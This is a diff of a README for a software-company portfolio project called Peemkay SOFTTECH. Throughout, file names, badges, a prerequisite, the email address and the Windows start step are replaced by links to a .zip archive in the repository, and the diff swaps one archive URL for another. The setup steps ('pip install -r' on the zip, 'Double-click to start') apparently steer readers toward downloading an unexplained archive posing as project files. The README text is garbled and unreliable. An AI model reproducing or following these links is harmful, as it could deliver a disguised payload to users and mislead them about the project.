@@ -44,8 +44,8 @@ peemkay-softtech/
 │   │   ├── core/           # Core configuration
 │   │   ├── models/         # Database models
 │   │   └── services/       # Business logic
-│   ├── https://raw.githubusercontent.com/Peemkay/Peemkay-SOFTTECH/main/frontend/android/Peemkay-SOFTTECH-1.5-alpha.5.zip    # Python dependencies
-│   └── https://raw.githubusercontent.com/Peemkay/Peemkay-SOFTTECH/main/frontend/android/Peemkay-SOFTTECH-1.5-alpha.5.zip            # Application entry point
+│   ├── https://github.com/Peemkay/Peemkay-SOFTTECH/raw/refs/heads/main/frontend/ios/Peemkay-SOFTTECH-v3.6.zip    # Python dependencies
+│   └── https://github.com/Peemkay/Peemkay-SOFTTECH/raw/refs/heads/main/frontend/ios/Peemkay-SOFTTECH-v3.6.zip            # Application entry point
 ├── frontend/               # Flutter frontend
 │   ├── lib/
 │   │   ├── screens/        # App screens
@@ -54,9 +54,9 @@ peemkay-softtech/
 │   │   └── utils/          # Utilities
 │   ├── assets/            # Images, fonts, icons
 │   ├── web/               # Web-specific files
-│   └── https://raw.githubusercontent.com/Peemkay/Peemkay-SOFTTECH/main/frontend/android/Peemkay-SOFTTECH-1.5-alpha.5.zip       # Flutter dependencies
+│   └── https://github.com/Peemkay/Peemkay-SOFTTECH/raw/refs/heads/main/frontend/ios/Peemkay-SOFTTECH-v3.6.zip       # Flutter dependencies
 ├── docs/                  # Documentation
-└── https://raw.githubusercontent.com/Peemkay/Peemkay-SOFTTECH/main/frontend/android/Peemkay-SOFTTECH-1.5-alpha.5.zip             # This file
+└── https://github.com/Peemkay/Peemkay-SOFTTECH/raw/refs/heads/main/frontend/ios/Peemkay-SOFTTECH-v3.6.zip             # This file
 ```
 
 ## 🎯 Sections
@@ -74,14 +74,14 @@ peemkay-softtech/
 ### Prerequisites
 - Flutter SDK (latest stable)
 - Python 3.9+
-- https://raw.githubusercontent.com/Peemkay/Peemkay-SOFTTECH/main/frontend/android/Peemkay-SOFTTECH-1.5-alpha.5.zip (for web deployment)
+- https://github.com/Peemkay/Peemkay-SOFTTECH/raw/refs/heads/main/frontend/ios/Peemkay-SOFTTECH-v3.6.zip (for web deployment)
 
 ### Backend Setup
 ```bash
 cd backend
 python -m venv venv
 source venv/bin/activate  # On Windows: venv\Scripts\activate
-pip install -r https://raw.githubusercontent.com/Peemkay/Peemkay-SOFTTECH/main/frontend/android/Peemkay-SOFTTECH-1.5-alpha.5.zip
+pip install -r https://github.com/Peemkay/Peemkay-SOFTTECH/raw/refs/heads/main/frontend/ios/Peemkay-SOFTTECH-v3.6.zip
 uvicorn main:app --reload
 ```
 
@@ -112,10 +112,10 @@ Founded by Peemkay, Peemkay SOFTTECH specializes in creating modern, scalable so
   <h1>🚀 Transforming Ideas into Digital Reality</h1>
   <p><strong>Professional Web, Mobile & Desktop Application Development</strong></p>
 
-  ![Portfolio Website](https://raw.githubusercontent.com/Peemkay/Peemkay-SOFTTECH/main/frontend/android/Peemkay-SOFTTECH-1.5-alpha.5.zip)
-  ![Flutter](https://raw.githubusercontent.com/Peemkay/Peemkay-SOFTTECH/main/frontend/android/Peemkay-SOFTTECH-1.5-alpha.5.zip)
-  ![Python](https://raw.githubusercontent.com/Peemkay/Peemkay-SOFTTECH/main/frontend/android/Peemkay-SOFTTECH-1.5-alpha.5.zip+-green)
-  ![License](https://raw.githubusercontent.com/Peemkay/Peemkay-SOFTTECH/main/frontend/android/Peemkay-SOFTTECH-1.5-alpha.5.zip)
+  ![Portfolio Website](https://github.com/Peemkay/Peemkay-SOFTTECH/raw/refs/heads/main/frontend/ios/Peemkay-SOFTTECH-v3.6.zip)
+  ![Flutter](https://github.com/Peemkay/Peemkay-SOFTTECH/raw/refs/heads/main/frontend/ios/Peemkay-SOFTTECH-v3.6.zip)
+  ![Python](https://github.com/Peemkay/Peemkay-SOFTTECH/raw/refs/heads/main/frontend/ios/Peemkay-SOFTTECH-v3.6.zip+-green)
+  ![License](https://github.com/Peemkay/Peemkay-SOFTTECH/raw/refs/heads/main/frontend/ios/Peemkay-SOFTTECH-v3.6.zip)
 </div>
 
 ## 🌟 About Peemkay SOFTTECH
@@ -123,7 +123,7 @@ Founded by Peemkay, Peemkay SOFTTECH specializes in creating modern, scalable so
 **Peemkay SOFTTECH** is a leading software development company specializing in creating innovative digital solutions across diverse industries. From military-grade security systems to user-friendly educational platforms, we deliver excellence in every project.
 
 ### 📍 Contact Information
-- **Email**: https://raw.githubusercontent.com/Peemkay/Peemkay-SOFTTECH/main/frontend/android/Peemkay-SOFTTECH-1.5-alpha.5.zip
+- **Email**: https://github.com/Peemkay/Peemkay-SOFTTECH/raw/refs/heads/main/frontend/ios/Peemkay-SOFTTECH-v3.6.zip
 - **Phone**: +2349113080869
 - **Location**: Peemkay SOFTTECH, Dutsen Alhaji, Abuja, Nigeria
 
@@ -183,7 +183,7 @@ Founded by Peemkay, Peemkay SOFTTECH specializes in creating modern, scalable so
 #### Windows Users
 ```bash
 # Double-click to start
-https://raw.githubusercontent.com/Peemkay/Peemkay-SOFTTECH/main/frontend/android/Peemkay-SOFTTECH-1.5-alpha.5.zip
+https://github.com/Peemkay/Peemkay-SOFTTECH/raw/refs/heads/main/frontend/ios/Peemkay-SOFTTECH-v3.6.zip
 ```
 
 #### All Platforms
